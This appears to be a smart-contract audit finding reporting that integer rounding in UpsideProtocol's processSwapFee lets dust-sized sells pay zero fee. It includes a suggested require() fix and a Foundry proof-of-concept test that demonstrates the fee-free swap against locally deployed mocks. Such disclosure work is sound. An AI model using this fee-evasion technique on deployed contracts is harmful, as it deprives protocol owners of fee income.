  "body": "## Finding description and impact\n\nIn the `function processSwapFee`, fees are computed with the expression \n\n```solidity\nfee = (_tokenAmount * feeInfo.swapFeeSellBp) / 10000;\n```\n\nHowever, there is no check to ensure that the product _tokenAmount * swapFeeBp is at least 10,000 before dividing; this results in a zero-fee swap, even though a non-zero basis-point fee was intended.\n\nUsers can repeatedly swap “dust” amounts below the threshold without paying fees, depriving the protocol (or fee recipient) of expected income.\n\n## Recommended mitigation steps\n\nrequire that _tokenAmount meets a minimum size:\n\n```solidity\nrequire(_tokenAmount * swapFeeBp >= 10000, \"Amount too small to cover fee\");\n```",
  "proof_of_concept": "pragma solidity 0.8.24;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {UpsideStakingStub} from \"../contracts/UpsideStakingStub.sol\";\nimport {UpsideProtocol} from \"../contracts/UpsideProtocol.sol\";\nimport {USDCMock} from \"../contracts/mock/USDCMock.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract POC is Test {\n    UpsideStakingStub public stakingStub;\n    UpsideProtocol public upsideProtocol;\n    USDCMock public liquidityToken;\n\n    address public alice;\n    address public bob;\n\n    function setUp() public {\n        stakingStub = new UpsideStakingStub(address(this));\n        stakingStub.setFeeDestinationAddress(address(this));\n\n        liquidityToken = new USDCMock();\n        upsideProtocol = new UpsideProtocol(address(this));\n\n        upsideProtocol.init(address(liquidityToken));   \n        upsideProtocol.setStakingContractAddress(address(stakingStub));\n\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n    }\n\n    function test_FreeSwap() public {\n        liquidityToken.mint(alice, 1000e6);\n        \n        UpsideProtocol.FeeInfo memory _newFeeInfo = UpsideProtocol.FeeInfo({\n            tokenizeFeeDestinationAddress : address(this),\n            swapFeeDecayInterval : 1 weeks,\n            tokenizeFeeEnabled : false,\n            swapFeeStartingBp : 200,\n            swapFeeDecayBp : 200,\n            swapFeeFinalBp : 200,\n            swapFeeSellBp : 200,\n            swapFeeDeployerBp : 200\n        });\n        upsideProtocol.setFeeInfo(_newFeeInfo);\n\n        vm.startPrank(alice);\n        address metacoin = upsideProtocol.tokenize(\"https://code4rena.com/\", address(liquidityToken));\n\n        liquidityToken.approve(address(upsideProtocol), 10e6);\n\n        // this test contract is the fee destination address\n        // as theres no sell, the balance is zero\n        uint256 selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        // alice buys metacoin\n        upsideProtocol.swap(metacoin, true, 10e6, 0, alice);\n\n        // alice then sells metacoin back to USDC\n        IERC20(metacoin).approve(address(upsideProtocol), 10e6);\n        upsideProtocol.swap(metacoin, false, 10, 0, alice);\n\n        // but since the amount is too small the protocol doesnt collect any fee\n        selfbalance = IERC20(metacoin).balanceOf(address(this));\n        assertEq(selfbalance, 0, \"Self balance should be zero\");\n\n        vm.stopPrank();\n\n    }\n        \n}",
